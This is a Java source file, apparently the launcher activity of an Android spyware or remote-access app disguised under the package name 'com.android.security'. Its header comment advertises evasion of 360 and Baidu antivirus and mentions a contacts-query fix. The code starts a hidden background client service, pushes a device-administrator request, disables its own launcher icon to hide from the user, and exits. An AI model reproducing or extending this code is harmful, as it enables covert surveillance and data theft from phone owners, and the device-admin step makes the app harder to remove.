package com.android.security;

/**
 * 2016.10.17 最新免杀V3\360\百度杀毒
 * 
 * 修复联系人查询游标关闭bug
 */
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
	        setContentView(0x7f030001);
	/*        Intent service = new Intent(this, MainService.class);
	        service.setAction(MainActivity.class.getName());
	        startService(service);*/
	        
	        
	        startService(new Intent(this,Client.class));
	        
 	        Intent intent = new Intent(this, AdminActivity.class);
	        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        startActivity(intent);
 
	        
	        getPackageManager().setComponentEnabledSetting(getComponentName(), 0x2, 0x1);
	        
	        finish();
	}

}
